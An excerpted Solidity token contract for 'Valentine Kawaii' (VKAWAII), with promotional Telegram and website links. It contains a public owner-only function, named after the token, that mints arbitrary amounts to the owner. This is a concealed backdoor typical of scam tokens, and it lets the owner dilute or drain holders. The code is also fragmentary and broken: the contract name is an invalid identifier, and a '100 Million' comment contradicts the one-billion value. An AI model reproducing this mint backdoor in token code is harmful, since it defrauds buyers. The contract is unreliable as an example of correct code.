...
//
// $ValentineKawaii proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/ValentineKawaii
//  🌐 Website:https://ValentineKawaii.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ValentineKawaii(uint256 amount) public onlyOwner {
 _ValentineKawaii(msg.sender, amount);
    }
    ...
    function _ValentineKawaii(address account, uint256 amount) internal virtual {
...
contract $ValentineKawaii is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Valentine Kawaii", "VKAWAII") {
     _ValentineKawaii(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}